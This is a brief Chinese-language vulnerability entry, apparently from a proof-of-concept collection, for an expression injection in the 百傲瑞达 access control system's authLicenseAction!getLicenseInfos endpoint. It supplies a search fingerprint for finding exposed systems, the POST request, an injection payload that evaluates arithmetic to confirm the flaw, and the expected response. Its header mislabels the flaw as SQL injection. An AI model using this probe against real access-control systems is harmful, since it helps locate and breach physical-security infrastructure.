# 百傲瑞达门禁系统authLicenseAction!getLicenseInfos存在表达式注入漏洞

百傲瑞达门禁系统authLicenseAction!getLicenseInfos ｜ SQL注入 ｜ —
- **指纹**：`body="authLicenseAction"`
- **请求**：`POST /authLicenseAction!getLicenseInfo.do HTTP/1.1`

**Payload**
```
debug=command&expression=%23{10000274-10598}
```
- **响应特征**：200